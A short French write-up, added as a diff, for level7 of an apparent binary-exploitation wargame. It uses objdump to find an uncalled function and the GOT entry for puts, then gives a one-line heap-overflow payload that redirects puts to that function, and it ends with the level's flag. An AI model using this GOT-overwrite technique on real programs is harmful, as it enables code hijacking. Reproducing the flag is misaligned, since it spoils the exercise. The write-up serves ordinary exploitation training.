@@ -1,0 +1,41 @@
+level7 dois prendre en parametre deux arguments minimum sinon il segfault
+
+avec objdump on constate qu'une fonction 'm' n'est jamais appele, quatre malloc on lieu ainsi qu'un call a 'fgets' suivi d'un call a 'puts'
+
+ 80485d3:	e8 58 fe ff ff       	call   8048430 <fopen@plt>
+ 80485d8:	89 44 24 08          	mov    %eax,0x8(%esp)
+ 80485dc:	c7 44 24 04 44 00 00 	movl   $0x44,0x4(%esp)
+ 80485e3:	00
+ 80485e4:	c7 04 24 60 99 04 08 	movl   $0x8049960,(%esp)
+ 80485eb:	e8 d0 fd ff ff       	call   80483c0 <fgets@plt>
+ 80485f0:	c7 04 24 03 87 04 08 	movl   $0x8048703,(%esp)
+ 80485f7:	e8 04 fe ff ff       	call   8048400 <puts@plt>
+ 80485fc:	b8 00 00 00 00       	mov    $0x0,%eax
+
+
+le programme segfault si nous passons plus de 20 characteres au premier argument
+
+comme pour le level5, on va essayer de modifier le GOT de 'puts' par l'addresse de la fonction 'm'
+
+objdump -R level7
+
+08049928 R_386_JUMP_SLOT   puts
+
+objdump -d level7
+
+080484f4 <m>:
+ 80484f4:	55                   	push   %ebp
+ 80484f5:	89 e5                	mov    %esp,%ebp
+ 80484f7:	83 ec 18             	sub    $0x18,%esp
+
+-----
+
+prepare:
+
+./level7 `python -c "print 'A' * 20 + '\x28\x99\x04\x08'"` `python -c "print '\xf4\x84\x04\x08'"`
+
+
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+
+
+
